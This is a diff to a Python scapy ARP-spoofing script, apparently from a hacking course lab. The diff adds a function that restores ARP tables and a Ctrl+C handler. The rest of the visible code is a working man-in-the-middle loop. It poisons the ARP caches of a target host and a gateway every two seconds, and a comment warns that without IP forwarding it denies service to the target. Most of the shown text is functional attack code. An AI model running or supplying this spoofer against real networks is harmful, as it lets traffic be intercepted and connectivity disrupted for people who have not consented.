@@ -25,12 +25,29 @@ def spoof(target_ip, spoof_ip):
 	# Tell the target computer that we are the Gateway router
 	scapy.send(packet, verbose=false)
 
+# Restore - Both Target and Gateway
+def restore(dest_ip, src_ip):
+	dest_mac = get_mac(dest_ip)
+	# packet need source mac address this time, since it isn't attacker mac address
+	src_mac = get_mac(src_ip)
+	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
+	scapy.send(packet, count=4, verbose=false)
+
 # Don't forget to run `echo 1 > /proc/sys/net/ipv4/ip_forward` in a separate terminal window to enable ip forwarding. Otherwise you DoS the target machine
-packet_count = 0
-while True:
-	spoof("10.0.2.7", "10.0.2.1")
-	spoof("10.0.2.1", "10.0.2.7")
-	packet_count = packet_count + 2
-	print("\r[+] Packets sent: ", str(packet_count)), # Prints from beginning of line
-	sys.stdout.flush() # Flush standard output and print whatevers in there immediately
-	time.sleep(2)
+
+target_ip = "10.0.2.7"
+gateway_ip = "10.0.2.1"
+
+try:
+	packet_count = 0
+	while True:
+		spoof(target_ip, gateway_ip)
+		spoof(gateway_ip, target_ip)
+		packet_count = packet_count + 2
+		print("\r[+] Packets sent: ", str(packet_count)), # Prints from beginning of line
+		sys.stdout.flush() # Flush standard output and print whatevers in there immediately
+		time.sleep(2)
+except KeyboardInterrupt:
+	print("[-] Detected CTRL + C ... Resetting ARP Tables... Please wait")
+	restore(target_ip, gateway_ip)
+	restore(gateway_ip, target_ip)
